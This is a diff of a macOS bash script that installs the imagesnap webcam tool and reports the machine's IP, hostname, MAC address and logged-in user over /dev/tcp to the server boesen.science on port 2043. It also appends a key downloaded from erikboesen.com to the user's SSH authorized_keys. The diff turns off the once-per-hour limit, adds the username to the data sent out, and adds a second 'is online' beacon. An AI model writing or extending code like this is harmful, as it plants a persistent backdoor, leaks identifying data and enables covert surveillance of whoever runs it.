@@ -1,11 +1,11 @@
 #!/bin/bash
 
 # Prevent from running twice per hour
-if [[ $(< /tmp/last) = `date +"%H"` ]]; then
-	exit 1
-else
-	date +"%H" > /tmp/last
-fi
+#if [[ $(< /tmp/last) = `date +"%H"` ]]; then
+#	exit 1
+#else
+#	date +"%H" > /tmp/last
+#fi
 
 # Install ImageSnap for easy photo taking
 if [ ! -f /usr/local/bin/imagesnap ]; then
@@ -19,9 +19,10 @@ if [ ! -f /usr/local/bin/imagesnap ]; then
 fi
 
 # Linux's hostname -I doesn't work on Macs
+USER=`stat -f "%Su" /dev/console`
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
 HOSTNAME=`hostname`
-MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`
+MAC=`ifconfig en0 | awk '/ether/{print $2}'`
 
 SERVER="boesen.science"
 PORT=2043
@@ -30,7 +31,7 @@ if [[ $(< /tmp/ip) != "$IP" ]]; then
 	printf "$IP" > /tmp/ip
 
 	exec 3<>/dev/tcp/$SERVER/$PORT
-	printf "UPDATE: $IP $HOSTNAME $MAC" >&3
+	printf "UPDATE: $USER $IP $HOSTNAME $MAC" >&3
 
 	cat <&3
 fi
@@ -53,3 +54,6 @@ mkdir -p "$SSHPATH"
 if ! grep boesene $SSHPATH/authorized_keys; then
 	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
 fi
+
+exec 3<>/dev/tcp/$SERVER/$PORT
+printf "$IP is online" >&3
